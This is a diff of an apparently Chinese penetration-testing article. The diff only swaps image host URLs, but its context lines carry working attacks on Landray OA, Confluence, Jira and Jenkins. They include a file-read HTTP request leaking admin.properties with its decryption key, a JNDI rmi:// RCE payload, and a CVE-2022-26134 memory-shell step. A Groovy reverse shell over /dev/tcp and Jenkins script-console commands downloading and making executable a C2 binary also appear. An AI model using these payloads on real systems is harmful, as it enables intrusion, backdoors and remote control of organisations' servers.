@@ -29,7 +29,7 @@ ___发表于_
 
 访问路径/login_listyes.jsp，密码：yes
 
-![](https://gitee.com/fuli009/images/raw/master/public/20230715093333.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230715093333.png)
 
  **2、 蓝凌OA前台任意文件读取**
 
@@ -40,15 +40,15 @@ ___发表于_
     POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0Content-Length: 60Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Cache-Control: no-cacheContent-Type: application/x-www-form-urlencodedPragma: no-cacheUpgrade-Insecure-Requests: 1Accept-Encoding: gzip  
     var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}
 
-![](https://gitee.com/fuli009/images/raw/master/public/20230715093334.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230715093334.png)
 
 解密密码：kmssAdminKey  
 
-![](https://gitee.com/fuli009/images/raw/master/public/20230715093335.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230715093335.png)
 
 后台地址：/admin.do
 
-![](https://gitee.com/fuli009/images/raw/master/public/20230715093336.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230715093336.png)
 
  **3、蓝凌OA后台JNDI远程命令执行**
 
@@ -63,36 +63,36 @@ ___发表于_
     POST /admin.do HTTP/1.1Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: Content-Type: application/x-www-form-urlencodedContent-Length: 69  
     method=testDbConn&datasource=rmi://******:1099/remoteExploit7
 
-![](https://gitee.com/fuli009/images/raw/master/public/20230715093337.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230715093337.png)
 
-![](https://gitee.com/fuli009/images/raw/master/public/20230715093339.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230715093339.png)
 
-![](https://gitee.com/fuli009/images/raw/master/public/20230715093340.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230715093340.png)
 
  **4、Confluence写入内存马**
 
 直接上工具，利用CVE-2022-26134写入内存马 **  
 **
 
-![](https://gitee.com/fuli009/images/raw/master/public/20230715093341.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230715093341.png)
 
-![](https://gitee.com/fuli009/images/raw/master/public/20230715093342.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230715093342.png)
 
 在请求配置中添加如下内容：  
 
-![](https://gitee.com/fuli009/images/raw/master/public/20230715093343.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230715093343.png)
 
 利用后渗透插件，一键添加Confluence管理员账号：  
 
-![](https://gitee.com/fuli009/images/raw/master/public/20230715093344.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230715093344.png)
 
-![](https://gitee.com/fuli009/images/raw/master/public/20230715093345.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230715093345.png)
 
  **5、Jira getshell**
 
 查看版本信息，路径：/secure/admin/ViewSystemInfo.jspa
 
-![](https://gitee.com/fuli009/images/raw/master/public/20230715093347.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230715093347.png)
 
 下载对应插件版本
 
@@ -102,11 +102,11 @@ ___发表于_
     
     https://marketplace.atlassian.com/apps/1218755/mygroovy/version-history
 
-![](https://gitee.com/fuli009/images/raw/master/public/20230715093348.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230715093348.png)
 
 进入插件管理，上传插件，路径：/plugins/servlet/upm
 
-![](https://gitee.com/fuli009/images/raw/master/public/20230715093349.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230715093349.png)
 
 上传后访问，/secure/JMWEGroovyScriptTester.jspa，执行如下命令
 
@@ -116,15 +116,15 @@ ___发表于_
     
     def r = Runtime.getRuntime()def p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ip/port;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])p.waitFor()
 
-![](https://gitee.com/fuli009/images/raw/master/public/20230715093350.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230715093350.png)
 
-![](https://gitee.com/fuli009/images/raw/master/public/20230715093352.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230715093352.png)
 
  **6、Jenkins getshell**
 
 路径：/jenkins/script
 
-![](https://gitee.com/fuli009/images/raw/master/public/20230715093353.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230715093353.png)
 
   * 
 
@@ -132,7 +132,7 @@ ___发表于_
     
     println "wget http://ip/c2".execute().text
 
-![](https://gitee.com/fuli009/images/raw/master/public/20230715093354.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230715093354.png)
 
   * 
 
@@ -140,7 +140,7 @@ ___发表于_
     
     println "ls -lt".execute().text
 
-![](https://gitee.com/fuli009/images/raw/master/public/20230715093355.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230715093355.png)
 
   * 
 
@@ -148,7 +148,7 @@ ___发表于_
     
     println "chmod +x c2".execute().text
 
-![](https://gitee.com/fuli009/images/raw/master/public/20230715093356.png)
+![](http://hk-proxy.gitwarp.com/https://raw.githubusercontent.com/tuchuang9/tc1/refs/heads/main/public/20230715093356.png)
 
   * 
 
